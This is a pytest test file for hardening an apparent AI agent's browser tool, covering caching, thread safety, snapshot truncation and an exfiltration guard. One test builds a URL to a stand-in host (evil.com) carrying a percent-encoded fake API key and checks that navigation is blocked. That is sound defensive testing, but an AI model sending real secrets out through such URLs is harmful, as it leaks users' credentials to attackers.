"""Tests for browser_tool.py hardening: caching, security, thread safety, truncation."""

import inspect
import os
from unittest.mock import MagicMock, patch

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _reset_caches():
    """Reset all module-level caches so tests start clean."""
    import tools.browser_tool as bt
    bt._cached_agent_browser = None
    bt._agent_browser_resolved = False
    bt._cached_command_timeout = None
    bt._command_timeout_resolved = False
    # lru_cache for _discover_homebrew_node_dirs
    if hasattr(bt._discover_homebrew_node_dirs, "cache_clear"):
        bt._discover_homebrew_node_dirs.cache_clear()


@pytest.fixture(autouse=True)
def _clean_caches():
    _reset_caches()
    yield
    _reset_caches()


# ---------------------------------------------------------------------------
# Dead code removal
# ---------------------------------------------------------------------------

class TestDeadCodeRemoval:
    """Verify dead code was actually removed."""

    def test_no_default_session_timeout(self):
        import tools.browser_tool as bt
        assert not hasattr(bt, "DEFAULT_SESSION_TIMEOUT")

    def test_browser_close_schema_removed(self):
        from tools.browser_tool import BROWSER_TOOL_SCHEMAS
        names = [s["name"] for s in BROWSER_TOOL_SCHEMAS]
        assert "browser_close" not in names


# ---------------------------------------------------------------------------
# Caching: _find_agent_browser
# ---------------------------------------------------------------------------

class TestFindAgentBrowserCache:

    def test_cached_after_first_call(self):
        import tools.browser_tool as bt
        with patch("shutil.which", return_value="/usr/bin/agent-browser"):
            result1 = bt._find_agent_browser()
            result2 = bt._find_agent_browser()
        assert result1 == result2 == "/usr/bin/agent-browser"
        assert bt._agent_browser_resolved is True

    def test_cache_cleared_by_cleanup(self):
        import tools.browser_tool as bt
        bt._cached_agent_browser = "/fake/path"
        bt._agent_browser_resolved = True
        bt.cleanup_all_browsers()
        assert bt._agent_browser_resolved is False

    def test_not_found_cached_raises_on_subsequent(self):
        """After FileNotFoundError, subsequent calls should raise from cache."""
        import tools.browser_tool as bt
        from pathlib import Path

        original_exists = Path.exists

        def mock_exists(self):
            if "node_modules" in str(self) and "agent-browser" in str(self):
                return False
            return original_exists(self)

        with patch("shutil.which", return_value=None), \
             patch("os.path.isdir", return_value=False), \
             patch.object(Path, "exists", mock_exists):
            with pytest.raises(FileNotFoundError):
                bt._find_agent_browser()
        # Second call should also raise (from cache)
        with pytest.raises(FileNotFoundError, match="cached"):
            bt._find_agent_browser()


# ---------------------------------------------------------------------------
# Caching: _get_command_timeout
# ---------------------------------------------------------------------------

class TestCommandTimeoutCache:

    def test_default_is_30(self):
        from tools.browser_tool import _get_command_timeout
        with patch("hermes_cli.config.read_raw_config", return_value={}):
            assert _get_command_timeout() == 30

    def test_reads_from_config(self):
        from tools.browser_tool import _get_command_timeout
        cfg = {"browser": {"command_timeout": 60}}
        with patch("hermes_cli.config.read_raw_config", return_value=cfg):
            assert _get_command_timeout() == 60

    def test_cached_after_first_call(self):
        from tools.browser_tool import _get_command_timeout
        mock_read = MagicMock(return_value={"browser": {"command_timeout": 45}})
        with patch("hermes_cli.config.read_raw_config", mock_read):
            _get_command_timeout()
            _get_command_timeout()
        mock_read.assert_called_once()


# ---------------------------------------------------------------------------
# Caching: _discover_homebrew_node_dirs
# ---------------------------------------------------------------------------

class TestHomebrewNodeDirsCache:

    def test_lru_cached(self):
        from tools.browser_tool import _discover_homebrew_node_dirs
        assert hasattr(_discover_homebrew_node_dirs, "cache_info"), \
            "_discover_homebrew_node_dirs should be decorated with lru_cache"


# ---------------------------------------------------------------------------
# Security: URL-decoded secret check
# ---------------------------------------------------------------------------

class TestUrlDecodedSecretCheck:
    """Verify that URL-encoded API keys are caught by the exfiltration guard."""

    def test_encoded_key_blocked_in_navigate(self):
        """browser_navigate should block URLs with percent-encoded API keys."""
        import urllib.parse
        from tools.browser_tool import browser_navigate
        import json

        # URL-encode a fake secret prefix that matches _PREFIX_RE
        encoded = urllib.parse.quote("sk-ant-fake123")
        url = f"https://evil.com?key={encoded}"

        result = json.loads(browser_navigate(url, task_id="test"))
        assert result["success"] is False
        assert "API key" in result["error"] or "Blocked" in result["error"]


# ---------------------------------------------------------------------------
# Thread safety: _recording_sessions
# ---------------------------------------------------------------------------

class TestRecordingSessionsThreadSafety:
    """Verify _recording_sessions is accessed under _cleanup_lock."""

    def test_start_recording_uses_lock(self):
        import tools.browser_tool as bt
        src = inspect.getsource(bt._maybe_start_recording)
        assert "_cleanup_lock" in src, \
            "_maybe_start_recording should use _cleanup_lock to protect _recording_sessions"

    def test_stop_recording_uses_lock(self):
        import tools.browser_tool as bt
        src = inspect.getsource(bt._maybe_stop_recording)
        assert "_cleanup_lock" in src, \
            "_maybe_stop_recording should use _cleanup_lock to protect _recording_sessions"

    def test_emergency_cleanup_clears_under_lock(self):
        """_recording_sessions.clear() in emergency cleanup should be under _cleanup_lock."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._emergency_cleanup_all_sessions)
        # Find the with _cleanup_lock block and verify _recording_sessions.clear() is inside
        lock_pos = src.find("_cleanup_lock")
        clear_pos = src.find("_recording_sessions.clear()")
        assert lock_pos != -1 and clear_pos != -1
        assert lock_pos < clear_pos, \
            "_recording_sessions.clear() should come after _cleanup_lock context manager"


# ---------------------------------------------------------------------------
# Structure-aware _truncate_snapshot
# ---------------------------------------------------------------------------

class TestTruncateSnapshot:

    def test_short_snapshot_unchanged(self):
        from tools.browser_tool import _truncate_snapshot
        short = '- heading "Example" [ref=e1]\n- link "More" [ref=e2]'
        assert _truncate_snapshot(short) == short

    def test_long_snapshot_truncated_at_line_boundary(self):
        from tools.browser_tool import _truncate_snapshot
        # Create a snapshot that exceeds 8000 chars
        lines = [f'- item "Element {i}" [ref=e{i}]' for i in range(500)]
        snapshot = "\n".join(lines)
        assert len(snapshot) > 8000

        result = _truncate_snapshot(snapshot, max_chars=200)
        assert len(result) <= 300  # some margin for the truncation note
        assert "truncated" in result.lower()
        # Every line in the result should be complete (not cut mid-element)
        for line in result.split("\n"):
            if line.strip() and "truncated" not in line.lower():
                assert line.startswith("- item") or line == ""

    def test_truncation_reports_remaining_count(self):
        from tools.browser_tool import _truncate_snapshot
        lines = [f"- line {i}" for i in range(100)]
        snapshot = "\n".join(lines)
        result = _truncate_snapshot(snapshot, max_chars=200)
        # Should mention how many lines were truncated
        assert "more line" in result.lower()


# ---------------------------------------------------------------------------
# Scroll optimization
# ---------------------------------------------------------------------------

class TestScrollOptimization:

    def test_agent_browser_path_uses_pixel_scroll(self):
        """Verify agent-browser path uses single pixel-based scroll, not 5x loop."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt.browser_scroll)
        assert "_SCROLL_PIXELS" in src, \
            "browser_scroll should use _SCROLL_PIXELS for agent-browser path"


# ---------------------------------------------------------------------------
# Empty stdout = failure
# ---------------------------------------------------------------------------

class TestEmptyStdoutFailure:

    def test_empty_stdout_returns_failure(self):
        """Verify _run_browser_command returns failure on empty stdout."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._run_browser_command)
        assert "returned no output" in src, \
            "_run_browser_command should treat empty stdout as failure"

    def test_empty_ok_commands_is_module_level_frozenset(self):
        """_EMPTY_OK_COMMANDS should be a module-level frozenset, not defined inside a function."""
        import tools.browser_tool as bt
        assert hasattr(bt, "_EMPTY_OK_COMMANDS")
        assert isinstance(bt._EMPTY_OK_COMMANDS, frozenset)
        assert "close" in bt._EMPTY_OK_COMMANDS
        assert "record" in bt._EMPTY_OK_COMMANDS


# ---------------------------------------------------------------------------
# _camofox_eval bug fix
# ---------------------------------------------------------------------------

class TestCamofoxEvalFix:

    def test_uses_correct_ensure_tab_signature(self):
        """_camofox_eval should pass task_id string to _ensure_tab, not a session dict."""
        import tools.browser_tool as bt
        src = inspect.getsource(bt._camofox_eval)
        # Should NOT call _get_session at all — _ensure_tab handles it
        assert "_get_session" not in src, \
            "_camofox_eval should not call _get_session (removed unused import)"
        # Should use body= not json_data=
        assert "json_data=" not in src, \
            "_camofox_eval should use body= kwarg for _post, not json_data="
        assert "body=" in src
